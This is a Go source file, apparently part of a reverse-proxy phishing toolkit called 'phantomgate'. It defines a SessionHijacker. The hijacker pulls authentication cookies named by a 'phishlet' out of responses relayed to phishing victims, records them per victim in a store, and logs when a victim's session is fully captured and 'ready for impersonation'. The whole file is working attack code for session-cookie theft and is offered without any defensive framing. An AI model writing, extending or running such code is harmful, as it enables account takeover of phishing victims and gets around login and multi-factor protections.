package capture

import (
	"log"
	"net/http"
	"strings"
	"sync"
	"time"

	"github.com/phantomgate/phantomgate/internal/phishlet"
	"github.com/phantomgate/phantomgate/internal/store"
)

// SessionHijacker captures authenticated session cookies from proxy responses
type SessionHijacker struct {
	store    *store.Store
	phishlet *phishlet.Phishlet
	mu       sync.Mutex
	captured map[string]map[string]bool // victimID → cookie_name → bool
}

// NewSessionHijacker creates a new session hijacker for the given phishlet
func NewSessionHijacker(s *store.Store, p *phishlet.Phishlet) *SessionHijacker {
	return &SessionHijacker{
		store:    s,
		phishlet: p,
		captured: make(map[string]map[string]bool),
	}
}

// InspectResponse checks if the target has set any auth session cookies
// that we should capture for the operator
func (sh *SessionHijacker) InspectResponse(resp *http.Response, victimID string) {
	cookies := resp.Cookies()
	if len(cookies) == 0 {
		return
	}

	capturedTokens := make(map[string]string)

	for _, authToken := range sh.phishlet.AuthTokens {
		for _, cookie := range cookies {
			cookieDomain := cookie.Domain
			if cookieDomain == "" {
				if resp.Request != nil && resp.Request.URL != nil {
					cookieDomain = resp.Request.URL.Host
				}
			}

			domainMatch := sh.domainMatches(cookieDomain, authToken.Domain)

			// When cookie has no explicit domain (common for same-origin cookies),
			// fall back to matching by cookie name alone — the phishlet already
			// defines which cookie names are auth-relevant.
			nameFallback := cookie.Domain == ""

			if domainMatch || nameFallback {
				for _, targetKey := range authToken.Keys {
					if strings.EqualFold(cookie.Name, targetKey) && cookie.Value != "" {
						capturedTokens[cookie.Name] = cookie.Value
					}
				}
			}
		}
	}

	if len(capturedTokens) == 0 {
		return
	}

	sh.mu.Lock()
	defer sh.mu.Unlock()

	if sh.captured[victimID] == nil {
		sh.captured[victimID] = make(map[string]bool)
	}

	newTokens := make(map[string]string)
	for k, v := range capturedTokens {
		if !sh.captured[victimID][k] {
			newTokens[k] = v
			sh.captured[victimID][k] = true
		}
	}

	if len(newTokens) == 0 {
		return
	}

	sess := store.CapturedSession{
		ID:        generateID(),
		VictimID:  victimID,
		Cookies:   capturedTokens,
		Phishlet:  sh.phishlet.Name,
		Timestamp: time.Now(),
		IsValid:   true,
	}

	sh.store.AddSession(sess)

	tokenNames := make([]string, 0, len(newTokens))
	for k := range newTokens {
		tokenNames = append(tokenNames, k)
	}

	log.Printf("[SESSION CAPTURED] Victim=%s | Tokens=%s | Total=%d",
		victimID, strings.Join(tokenNames, ", "), len(capturedTokens))

	allKeys := sh.phishlet.GetAllAuthCookieKeys()
	if sh.hasAllTokensLocked(victimID, allKeys) {
		log.Printf("[FULL SESSION HIJACK] Victim=%s | ALL auth tokens captured! Session is ready for impersonation.", victimID)
	}
}

// hasAllTokensLocked checks if we've captured every required auth token for a victim.
// Caller must hold sh.mu.
func (sh *SessionHijacker) hasAllTokensLocked(victimID string, requiredKeys []string) bool {
	captured, ok := sh.captured[victimID]
	if !ok {
		return false
	}
	for _, key := range requiredKeys {
		if !captured[key] {
			return false
		}
	}
	return true
}

// domainMatches checks if a cookie domain matches the phishlet auth token domain
func (sh *SessionHijacker) domainMatches(cookieDomain, tokenDomain string) bool {
	cookieDomain = strings.ToLower(strings.TrimPrefix(cookieDomain, "."))
	tokenDomain = strings.ToLower(strings.TrimPrefix(tokenDomain, "."))

	if cookieDomain == tokenDomain {
		return true
	}

	if strings.HasSuffix(cookieDomain, "."+tokenDomain) {
		return true
	}

	if strings.HasSuffix(tokenDomain, "."+cookieDomain) {
		return true
	}

	return false
}
